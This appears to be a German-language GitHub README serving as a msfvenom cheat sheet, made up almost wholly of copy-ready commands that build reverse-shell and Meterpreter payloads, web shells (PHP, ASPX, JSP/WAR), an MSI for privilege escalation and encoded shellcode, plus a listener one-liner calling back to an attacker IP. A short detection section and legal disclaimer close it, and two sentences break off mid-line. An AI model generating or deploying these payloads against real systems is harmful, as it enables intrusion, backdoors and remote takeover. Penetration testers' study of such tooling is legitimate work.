<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formate">
</p>

<p align="center">
  <b>💣 Master-Cheatsheet zum Generieren eigenständiger Payloads, Shellcodes und Hintertüren auf Windows-, Linux-, macOS-, Android- und Webplattformen</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht & Payload-Architektur](#-overview--payload-architecture)
  - [Inszenierte vs. stufenlose Nutzlasten](#staged-vs-stageless-payloads)
- [Wichtige Flags und Optionen](#-essential-flags--options)
- [Windows-Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Linux- und Unix-Payloads (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Web- und Web-Shell-Nutzlasten (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Shellcode-Generierung für die Exploit-Entwicklung (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Ungültige Zeichen entfernen (`-b`)](#stripping-bad-characters--b)
  - [Encoder und mehrere Iterationen (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Metasploit Multi-Handler Quick Setup](#-metasploit-multi-handler-quick-setup)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und Nutzlastarchitektur

**msfvenom** kombiniert die klassischen Dienstprogramme `msfpayload` und

### Gestaffelte vs. stufenlose Nutzlasten
- **Stufenweise (z. B. `windows/x64/meterpreter/reverse_tcp`):**
  Verwendet Schrägstriche zwischen Komponenten. Ein kleiner Stub (Stufe 0) stellt eine Verbindung zum Listener her und ruft die vollständig reflektierende DLL (Stufe 1) in den Speicher ab. Ideal für Exploits mit strengen Pufferlängenbeschränkungen.
- **Stufenlos (z. B. `windows/x64/meterpreter_reverse_tcp`):**
  Verwendet einen Unterstrich (`_`). Die gesamte Meterpreter-Nutzlast ist in der ausführbaren Datei oder im Shellcode enthalten. Funktioniert zuverlässig, ohne auf mehrstufige Netzwerk-Handshakes angewiesen zu sein, was es ideal für Befehlszeilen-Runner und Ausweichmanöver macht.

---

## ⚙️ Wichtige Flags und Optionen
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Flagge | Beschreibung |
|------|-------------|
| `-p, --payload` | Gibt die zu verwendende Nutzlast an (`--list payloads`, um alle anzuzeigen). |
| `-f, --format` | Ausgabeformat (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Shellcode-Encoder zur Beseitigung fehlerhafter Zeichen (`--list encoders`). |
| `-i, --iterations` | Anzahl der Kodierungsdurchgänge. |
| `-b, --bad-chars` | Im Shellcode zu vermeidende Zeichen (z. B. `\x00\x0a\x0d`). |
| `-x, --template` | Ausführbare Vorlage zum Einfügen von Nutzdaten. |
| `-k, --keep` | Behält die normale Ausführung der Vorlage in einem neuen Thread bei. |
| `-o, --out` | Pfad der Ausgabezieldatei. |

---

## 🪟 Windows-Payloads (EXE, DLL, MSI, PowerShell)

### Ausführbare Windows x64 Reverse Shell-Datei (stufenlos)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Ausführbare Windows x64-Staging-Reverse-TCP-Datei
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Windows-DLL-Injection-Nutzlast
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Windows MSI Installer (Privilegieneskalation über AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Base64-codierter PowerShell-Befehl
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Linux- und Unix-Payloads (ELF, Python, Bash)

### Linux x64 ELF Binär (stufenlos)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Reverse TCP (kein Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Eigenständiges Python-Reverse-Shell-Skript
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Reine Bash-Befehlszeichenfolge
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Web- und Web-Shell-Nutzlasten (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### Klassisches ASP und ASPX (IIS-Server)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Java WAR-Paket (Apache Tomcat Web Archive)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Shellcode-Generierung für die Exploit-Entwicklung (C, Raw, Python)

### Schlechte Zeichen entfernen (`-b`)
Nullbytes (`\x00`), Wagenrückläufe (`\r` =
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Encoder und mehrere Iterationen (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Metasploit Multi-Handler-Schnelleinrichtung

Fangen Sie Nutzlasten immer mit `multi/handler` von Metasploit ab:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Kurzreferenztabelle

| Zielplattform | Befehl |
|-----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP-Web-Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Roh-Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **Erkennung statischer Signaturen:** Standardmäßige Msfvenom-Vorlagen und -Encoder (`shikata_ga_nai`) verfügen über bekannte statische Signaturen, die von praktisch jeder modernen Antiviren-Engine identifiziert werden.
2. **Verhaltensbezogene EDR-Überwachung:** EDR-Agenten kennzeichnen abnormales Prozess-Spawnen (z. B. `cmd.exe` oder `powershell.exe`, das unter `w3wp.exe` oder `tomcat8.exe` erzeugt wurde).

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Msfvenom generiert funktionale offensive Payloads und Hintertüren. Es muss ausschließlich bei autorisierten Penetrationstests und in isolierten Laborforschungsumgebungen verwendet werden. Die unbefugte Generierung oder Ausführung auf Computern Dritter ist illegal.